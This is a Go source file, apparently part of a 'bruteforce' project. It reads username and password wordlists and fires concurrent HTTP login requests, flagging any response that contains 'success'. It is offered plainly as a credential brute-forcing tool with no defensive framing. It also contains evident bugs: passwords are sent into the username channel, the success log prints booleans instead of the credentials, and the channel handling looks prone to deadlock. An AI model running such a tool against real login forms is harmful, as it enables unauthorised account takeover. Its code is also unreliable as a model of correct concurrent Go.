package run

import (
	"bruteforce/utils"
	"bruteforce/utils/http"
	"bufio"
	"github.com/valyala/fasthttp"
	"io"
	"log"
	"os"
	"strings"
	"sync"
)

var (
	userChan = make(chan string,1)
	passChan = make(chan string)
	shadowChan = make(chan string)
	reqChan = make(chan *fasthttp.Request,utils.Goroutine)
	wg = sync.WaitGroup{}
	flag bool
	httpClient = http.HttpClient()
)

func ControllerManager() {
	wg.Add(1)
	go ReadUserfileController()
	wg.Add(1)
	go ReadPassfileController()
	wg.Add(1)
	go RequestController()
	wg.Add(1)
	for {
		req,ok :=<- reqChan
		if ok {
			wg.Add(1)
			go func(req *fasthttp.Request) {
				res,_ := http.Response(httpClient,req)
				if strings.Contains(res.String(),"success") {
					log.Printf("GET USERNAME : %v\nGET PASSWORD : %v\n",req.PostArgs().Has("username"),req.PostArgs().Has("password"))
				}
				wg.Done()
			}(req)
		} else {
			wg.Done()
		}
	}
}


func ReadUserfileController() {
	file,err:=os.Open(utils.Userpath)
	defer file.Close()
	if err!=nil{
		log.Panicln("Open Username File Error")
	}
	buf:=bufio.NewReader(file)
	for  {
		username,err:=buf.ReadString('\n')
		username=strings.TrimSpace(username)
		if err==io.EOF {
			close(userChan)
			wg.Done()
			break
		}
		userChan<-username
	}
}

func ReadPassfileController()  {
	file,err:=os.Open(utils.Passpath)
	defer file.Close()
	if err!=nil{
		log.Panicln("Open Username File Error")
	}
	buf:=bufio.NewReader(file)
	for  {
		password,err:=buf.ReadString('\n')
		password=strings.TrimSpace(password)
		if err==io.EOF {
			flag = true
			wg.Done()
			break
		}
		userChan<-password
	}
}

//生产http请求
func RequestController()  {
	for {
		username, ok := <-userChan
		if ok {
			args := utils.Args
			args.Set("username", username)
			if flag && len(passChan) == 0 {
				password := <-shadowChan
				args.Set("password", password)
				passChan <- password
			} else {
				password := <-passChan
				args.Set("password", password)
				shadowChan <- password
			}
			req := http.Request()
			reqChan <- req
		} else {
			close(reqChan)
			wg.Done()
			break
		}
	}
}